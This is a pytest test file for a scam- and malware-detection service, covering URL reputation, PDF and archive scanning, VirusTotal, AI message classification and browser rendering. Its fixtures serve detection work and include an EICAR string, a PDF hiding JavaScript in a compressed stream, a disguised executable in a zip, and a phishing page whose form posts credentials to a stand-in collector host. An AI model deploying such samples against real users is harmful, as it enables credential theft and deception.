"""Round 2 detection: Web Risk, certificate history, mail policy, rendered pages,
PDF streams, archive members, VirusTotal (with consent), regional and AI message checks."""

import io
import json
import zipfile
import zlib
from datetime import timedelta
from pathlib import Path

import dns.resolver
import httpx
import pytest
from fastapi.testclient import TestClient
from sqlalchemy.orm import Session

from app.ai import classify
from app.analyzers import file_scan, website_scan
from app.analyzers.types import Outcome
from app.core.config import get_settings
from app.intel import providers
from app.intel.feeds import MALWAREBAZAAR, FeedIndicator
from app.models.base import utcnow
from tests.conftest import seed_feed

SCANS = "/api/v1/scans"
# The autouse no_network fixture replaces these; keep the real ones for adapter tests.
REAL_WEB_RISK = providers.web_risk_lookup
REAL_FIRST_CERTIFICATE = providers.first_certificate_seen
REAL_MAIL_POLICY = website_scan._mail_policy_check
EICAR = rb"X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"


def categories(scan: dict) -> dict[str, str]:
    return {finding["category"]: finding["severity"] for finding in scan["findings"]}


def check(scan: dict, key: str) -> dict:
    return next(c for c in scan["checks"] if c["key"] == key)


def post(client: TestClient, kind: str, **kwargs: object) -> dict:
    response = client.post(f"{SCANS}/{kind}", **kwargs)  # type: ignore[arg-type]
    assert response.status_code == 202, response.text
    return response.json()


# --- Google Web Risk ------------------------------------------------------------------


def test_web_risk_listing_is_critical(client: TestClient, monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr(providers, "web_risk_lookup", lambda url: ["SOCIAL_ENGINEERING"])
    scan = post(client, "url", json={"url": "https://login-check.example.com/"})
    finding = next(f for f in scan["findings"] if f["source"] == "Google Web Risk API")
    assert finding["severity"] == "critical"
    assert "phishing" in finding["explanation"]
    assert scan["risk"] == "known_malicious"
    assert check(scan, "web_risk")["status"] == "completed"


def test_web_risk_adapter_parses_answers(monkeypatch: pytest.MonkeyPatch) -> None:
    seen: dict[str, object] = {}

    def fake_get(url: str, params: dict, timeout: float) -> httpx.Response:
        seen.update(params)
        return httpx.Response(
            200, json={"threat": {"threatTypes": ["MALWARE"]}}, request=httpx.Request("GET", url)
        )

    monkeypatch.setattr(get_settings(), "web_risk_api_key", "k")
    monkeypatch.setattr(providers.httpx, "get", fake_get)
    assert REAL_WEB_RISK("http://x.example/") == ["MALWARE"]
    assert seen["uri"] == "http://x.example/"


# --- Certificate transparency ---------------------------------------------------------


def test_recent_first_certificate_is_flagged(
    client: TestClient, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.setattr(
        providers, "first_certificate_seen", lambda domain: utcnow() - timedelta(days=2)
    )
    scan = post(client, "url", json={"url": "https://brand-new.example.com/"})
    assert categories(scan)["domain_age"] == "medium"
    assert "first security certificate" in scan["findings"][-1]["title"] or any(
        "certificate" in f["title"] for f in scan["findings"]
    )
    assert check(scan, "certificates")["status"] == "completed"


def test_crtsh_adapter_finds_earliest_certificate(monkeypatch: pytest.MonkeyPatch) -> None:
    entries = [{"not_before": "2024-05-01T10:00:00"}, {"not_before": "2019-02-03T00:00:00"}, {}]
    monkeypatch.setattr(
        providers.httpx,
        "get",
        lambda url, params, timeout: httpx.Response(
            200, json=entries, request=httpx.Request("GET", url)
        ),
    )
    first = REAL_FIRST_CERTIFICATE("example.com")
    assert first is not None and first.year == 2019


# --- Mail policy ----------------------------------------------------------------------


class _Txt:
    def __init__(self, text: str) -> None:
        self.strings = [text.encode()]


def test_missing_spf_and_dmarc_is_informational(monkeypatch: pytest.MonkeyPatch) -> None:
    def resolve(self: object, name: str, kind: str) -> list[_Txt]:
        raise dns.resolver.NoAnswer

    monkeypatch.setattr(dns.resolver.Resolver, "resolve", resolve)
    outcome = Outcome()
    REAL_MAIL_POLICY("example.com", outcome)
    assert outcome.findings[0].category == "email_security"
    assert outcome.findings[0].severity == "info"


def test_enforcing_dmarc_is_recognised(monkeypatch: pytest.MonkeyPatch) -> None:
    records = {
        "example.com": [_Txt("v=spf1 include:_spf.example.com -all")],
        "_dmarc.example.com": [_Txt("v=DMARC1; p=reject; rua=mailto:d@example.com")],
    }
    monkeypatch.setattr(dns.resolver.Resolver, "resolve", lambda self, name, kind: records[name])
    outcome = Outcome()
    REAL_MAIL_POLICY("example.com", outcome)
    assert outcome.findings == []
    assert "enforcing DMARC" in outcome.checks[0].detail
    assert outcome.details["mail_policy"]["spf"].startswith("v=spf1")


# --- PDF streams ----------------------------------------------------------------------


def pdf_with_hidden_javascript() -> bytes:
    hidden = zlib.compress(b"<< /Type /Action /S /JavaScript /JS (app.alert(1)) >>")
    return (
        b"%PDF-1.7\n1 0 obj\n<< /Type /Catalog /OpenAction 2 0 R >>\nendobj\n"
        b"2 0 obj\n<< /Type /ObjStm /Length " + str(len(hidden)).encode() + b" /Filter "
        b"/FlateDecode >>\nstream\n" + hidden + b"\nendstream\nendobj\n%%EOF"
    )


def test_javascript_hidden_in_compressed_stream_is_found(client: TestClient) -> None:
    content = pdf_with_hidden_javascript()
    assert b"/JavaScript" not in content
    scan = post(client, "file", files={"file": ("invoice.pdf", content)})
    assert categories(scan)["pdf_active_content"] == "medium"
    assert scan["details"]["pdf_streams_unpacked"] == 1


def test_pdf_stream_bomb_is_bounded() -> None:
    bomb = zlib.compress(b"\0" * (50 * 1024 * 1024))
    content = b"%PDF-1.4\n<< /Filter /FlateDecode >>\nstream\n" + bomb + b"\nendstream\n"
    inflated, streams = file_scan.inflate_pdf_streams(content)
    assert streams == 1
    assert len(inflated) <= file_scan._MAX_PDF_STREAM_BYTES


# --- Archive members ------------------------------------------------------------------


def make_zip(entries: dict[str, bytes]) -> bytes:
    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, "w", zipfile.ZIP_DEFLATED) as archive:
        for name, content in entries.items():
            archive.writestr(name, content)
    return buffer.getvalue()


def test_program_disguised_inside_archive(client: TestClient) -> None:
    content = make_zip({"photos/holiday.jpg": b"MZ\x90\x00" + b"\0" * 200, "notes.txt": b"hi"})
    scan = post(client, "file", files={"file": ("photos.zip", content)})
    assert categories(scan)["disguised_file"] == "high"
    assert scan["details"]["archive_members_scanned"] == 2


def test_eicar_inside_archive_is_detected(client: TestClient) -> None:
    scan = post(client, "file", files={"file": ("test.zip", make_zip({"a/eicar.com": EICAR}))})
    assert any("inside the archive" in f["title"] for f in scan["findings"])
    assert scan["risk"] == "known_malicious"


def test_archive_member_matching_malware_hash(client: TestClient, db: Session) -> None:
    import hashlib

    payload = b"pretend malware sample bytes"
    seed_feed(
        db, MALWAREBAZAAR, [FeedIndicator("sha256", hashlib.sha256(payload).hexdigest(), "x")]
    )
    scan = post(client, "file", files={"file": ("bundle.zip", make_zip({"tool.bin": payload}))})
    assert any("inside this archive" in f["title"] for f in scan["findings"])
    assert scan["risk"] == "known_malicious"
    assert "_member_hashes" not in scan["details"]


# --- VirusTotal -----------------------------------------------------------------------


def test_virustotal_is_only_used_with_consent(
    client: TestClient, monkeypatch: pytest.MonkeyPatch
) -> None:
    calls: list[str] = []

    def lookup(sha256: str) -> providers.VirusTotalResult:
        calls.append(sha256)
        return providers.VirusTotalResult(True, malicious=41, engines=70, label="trojan.emotet")

    monkeypatch.setattr(providers, "virustotal_hash", lookup)
    without = post(client, "file", files={"file": ("a.txt", b"hello there friend")})
    assert calls == [] and all(c["key"] != "virustotal" for c in without["checks"])

    scan = post(
        client,
        "file",
        files={"file": ("a.txt", b"hello there friend")},
        data={"virustotal_consent": "true"},
    )
    assert calls == [scan["details"]["sha256"]]
    assert scan["risk"] == "known_malicious"
    assert scan["details"]["virustotal"]["label"] == "trojan.emotet"


def test_virustotal_unknown_file_says_nothing_about_safety(
    client: TestClient, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.setattr(providers, "virustotal_hash", lambda sha: providers.VirusTotalResult(False))
    scan = post(
        client, "file", files={"file": ("b.txt", b"another file")}, data={"virustotal_consent": "1"}
    )
    assert "says nothing about safety" in check(scan, "virustotal")["detail"]


# --- Regional message patterns --------------------------------------------------------


@pytest.mark.parametrize(
    ("text", "category"),
    [
        (
            "Dubai Police: you have an unpaid traffic fine of AED 500. Pay now at the link",
            "fine_scam",
        ),
        ("لديك مخالفة مرورية غير مسددة، يرجى السداد عبر الرابط لتجنب الإيقاف", "fine_scam"),
        (
            "Absher: your account needs to be updated, click here to verify your ID",
            "government_impersonation",
        ),
        ("أبشر: تم تعليق خدماتك، اضغط هنا لتحديث بياناتك فورًا", "government_impersonation"),
        ("Cheap Umrah package with guaranteed visa, limited seats, book now!", "pilgrimage_scam"),
        ("عروض الحج بسعر مخفض وتصريح مضمون، احجز الآن", "pilgrimage_scam"),
        ("Your electricity will be disconnected today unless you settle the bill", "utility_scam"),
    ],
)
def test_regional_scam_patterns(client: TestClient, text: str, category: str) -> None:
    scan = post(client, "message", json={"content": text})
    assert category in categories(scan), scan["findings"]


# --- AI message classification --------------------------------------------------------


def test_masking_removes_links_emails_and_numbers() -> None:
    masked = classify.mask("Pay at https://evil.example/x or mail a@b.com, call +971 50 123 4567")
    assert "evil" not in masked and "a@b.com" not in masked and "4567" not in masked
    assert "[LINK]" in masked and "[EMAIL]" in masked


def test_ai_opinion_needs_consent_and_never_decides(
    client: TestClient, monkeypatch: pytest.MonkeyPatch
) -> None:
    sent: list[dict] = []

    def respond(request: httpx.Request) -> httpx.Response:
        sent.append(json.loads(request.content))
        answer = {"label": "likely_scam", "reason": "Asks for money urgently. See http://x.y"}
        return httpx.Response(200, json={"choices": [{"message": {"content": json.dumps(answer)}}]})

    original = httpx.Client
    monkeypatch.setattr(
        classify.httpx, "Client", lambda **kw: original(transport=httpx.MockTransport(respond))
    )
    monkeypatch.setattr(get_settings(), "openai_api_key", "k")
    monkeypatch.setattr(get_settings(), "openai_model", "test-model")
    text = "Hello, please send me the money today at https://pay.example.net/ thanks a lot"

    post(client, "message", json={"content": text})
    assert sent == []

    scan = post(client, "message", json={"content": text, "ai_consent": True})
    assert len(sent) == 1
    user_message = sent[0]["messages"][1]["content"]
    assert "pay.example.net" not in user_message
    ai = next(f for f in scan["findings"] if f["category"] == "ai_opinion")
    assert ai["severity"] == "low"
    assert "http://x.y" not in ai["explanation"]
    assert check(scan, "ai_classification")["status"] == "completed"


def test_ai_unexpected_label_is_rejected(monkeypatch: pytest.MonkeyPatch) -> None:
    def respond(request: httpx.Request) -> httpx.Response:
        content = json.dumps({"label": "definitely_safe", "reason": "trust me"})
        return httpx.Response(200, json={"choices": [{"message": {"content": content}}]})

    monkeypatch.setattr(get_settings(), "openai_api_key", "k")
    monkeypatch.setattr(get_settings(), "openai_model", "m")
    with pytest.raises(classify.ClassificationUnavailableError):
        classify.classify_message(
            "some text here", client=httpx.Client(transport=httpx.MockTransport(respond))
        )


# --- Isolated browser rendering -------------------------------------------------------

SCRIPTED_PHISHING = b"""<!doctype html><html><head><title>Loading</title></head><body>
<div id="app"></div>
<script>
document.title = "Microsoft account | Sign in";
const form = document.createElement("form");
form.action = "https://collector.example.com/c.php";
form.method = "post";
form.innerHTML = '<h1>Sign in to Microsoft</h1><input name="u"><input type="password" name="p">';
document.getElementById("app").appendChild(form);
fetch("/beacon", {method: "POST", body: "x"}).catch(() => {});
</script></body></html>"""


def _browser_available() -> bool:
    try:
        import playwright.sync_api  # noqa: F401
    except ImportError:
        return False
    import os

    return bool(os.environ.get("SENTINEL_BROWSER_EXECUTABLE") or os.path.isdir("/opt/pw-browsers"))


@pytest.mark.skipif(not _browser_available(), reason="headless browser not installed")
def test_rendered_page_reveals_script_built_phishing_form(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    import glob
    import ipaddress
    import threading
    from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

    from app.analyzers import page_render, safe_fetch
    from app.analyzers.urls import parse_url

    posts: list[str] = []

    class Handler(BaseHTTPRequestHandler):
        def do_GET(self) -> None:
            self.send_response(200)
            self.send_header("Content-Type", "text/html")
            self.end_headers()
            self.wfile.write(SCRIPTED_PHISHING)

        def do_POST(self) -> None:
            posts.append(self.path)
            self.send_response(204)
            self.end_headers()

        def log_message(self, *args: object) -> None:
            pass

    server = ThreadingHTTPServer(("127.0.0.1", 0), Handler)
    port = server.server_address[1]
    threading.Thread(target=server.serve_forever, daemon=True).start()

    def loopback_only(address: ipaddress.IPv4Address | ipaddress.IPv6Address) -> bool:
        return not address.is_loopback

    import os

    executable = os.environ.get("SENTINEL_BROWSER_EXECUTABLE") or next(
        iter(sorted(glob.glob("/opt/pw-browsers/chromium-*/chrome-linux*/chrome"))), None
    )
    monkeypatch.setattr(safe_fetch, "is_forbidden_address", loopback_only)
    monkeypatch.setattr(safe_fetch, "ALLOWED_PORTS", frozenset({port}))
    monkeypatch.setattr(safe_fetch, "resolve_host", lambda host, p: ["127.0.0.1"])
    monkeypatch.setattr(get_settings(), "browser_rendering", True)
    monkeypatch.setattr(get_settings(), "browser_executable", executable)
    try:
        url = parse_url(f"http://login.example.net:{port}/")
        result = page_render.render_page(url.normalized)
        assert result.title == "Microsoft account | Sign in"
        assert any(r.startswith("POST") for r in result.refused)
        assert posts == []  # the page's POST never left the browser

        monkeypatch.setattr(website_scan, "render_page", page_render.render_page)
        outcome = Outcome()
        assert website_scan._rendered_check(url, outcome)
        found = {f.category for f in outcome.findings}
        assert "brand_impersonation" in found and "external_form" in found
        assert outcome.details["page"]["rendered"]["forms_after_scripts"] == 1
    finally:
        server.shutdown()
        server.server_close()


def test_rendering_off_by_default_leaves_a_limitation(client: TestClient) -> None:
    scan = post(client, "website", json={"url": "https://example.org/"})
    assert any("Isolated browser inspection is not enabled" in x for x in scan["limitations"])


@pytest.mark.skipif(not _browser_available(), reason="headless browser not installed")
def test_visual_copy_of_a_sign_in_page_is_recognised(
    monkeypatch: pytest.MonkeyPatch, tmp_path: Path
) -> None:
    import glob
    import ipaddress
    import os
    import threading
    from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

    from app.analyzers import page_render, safe_fetch, visual
    from app.analyzers.urls import parse_url

    real_page = b"""<!doctype html><html><head><title>Sign in</title><style>
    body{margin:0;font-family:sans-serif;background:#f1f5fb}
    header{background:#0a3d91;height:120px}
    form{margin:80px auto;width:420px;background:#fff;padding:40px;border-radius:12px}
    input{display:block;width:100%;height:44px;margin:12px 0}
    button{width:100%;height:48px;background:#e3a400;border:0}
    </style></head><body><header></header><form><h1>Welcome</h1>
    <input><input type=password><button>Log in</button></form></body></html>"""
    copied_page = real_page.replace(b"Welcome", b"Welcome back")

    class Handler(BaseHTTPRequestHandler):
        def do_GET(self) -> None:
            body = copied_page if "copy" in (self.headers.get("Host") or "") else real_page
            self.send_response(200)
            self.send_header("Content-Type", "text/html")
            self.end_headers()
            self.wfile.write(body)

        def log_message(self, *args: object) -> None:
            pass

    server = ThreadingHTTPServer(("127.0.0.1", 0), Handler)
    port = server.server_address[1]
    threading.Thread(target=server.serve_forever, daemon=True).start()

    def loopback_only(address: ipaddress.IPv4Address | ipaddress.IPv6Address) -> bool:
        return not address.is_loopback

    executable = os.environ.get("SENTINEL_BROWSER_EXECUTABLE") or next(
        iter(sorted(glob.glob("/opt/pw-browsers/chromium-*/chrome-linux*/chrome"))), None
    )
    monkeypatch.setattr(safe_fetch, "is_forbidden_address", loopback_only)
    monkeypatch.setattr(safe_fetch, "ALLOWED_PORTS", frozenset({port}))
    monkeypatch.setattr(safe_fetch, "resolve_host", lambda host, p: ["127.0.0.1"])
    monkeypatch.setattr(get_settings(), "browser_rendering", True)
    monkeypatch.setattr(get_settings(), "browser_executable", executable)
    monkeypatch.setattr(get_settings(), "brand_reference_file", tmp_path / "refs.json")
    monkeypatch.setattr(website_scan, "render_page", page_render.render_page)
    try:
        real = page_render.render_page(f"http://signin.examplebank.com:{port}/")
        assert real.screenshot
        visual.save_reference(
            visual.Reference(
                "examplebank", frozenset({"examplebank.com"}), visual.dhash(real.screenshot), "x"
            )
        )

        copy = parse_url(f"http://examplebank-copy.example.net:{port}/")
        outcome = Outcome()
        assert website_scan._rendered_check(copy, outcome)
        finding = next(f for f in outcome.findings if f.category == "visual_impersonation")
        assert finding.severity == "high"

        genuine = parse_url(f"http://signin.examplebank.com:{port}/")
        outcome = Outcome()
        website_scan._rendered_check(genuine, outcome)
        assert not any(f.category == "visual_impersonation" for f in outcome.findings)
    finally:
        server.shutdown()
        server.server_close()


def test_dhash_distance_is_small_for_similar_images() -> None:
    import io

    from PIL import Image, ImageDraw

    from app.analyzers.visual import Reference, closest_match, dhash, distance

    def picture(shift: int, colour: str) -> bytes:
        image = Image.new("RGB", (400, 300), "white")
        ImageDraw.Draw(image).rectangle([50 + shift, 50, 300 + shift, 200], fill=colour)
        out = io.BytesIO()
        image.save(out, format="PNG")
        return out.getvalue()

    a, b, other = dhash(picture(0, "navy")), dhash(picture(2, "navy")), dhash(picture(0, "white"))
    assert distance(a, b) <= 6 < distance(a, other)
    refs = [Reference("bank", frozenset({"bank.com"}), a, "")]
    assert closest_match(b, "evil.com", refs) is not None
    assert closest_match(b, "bank.com", refs) is None
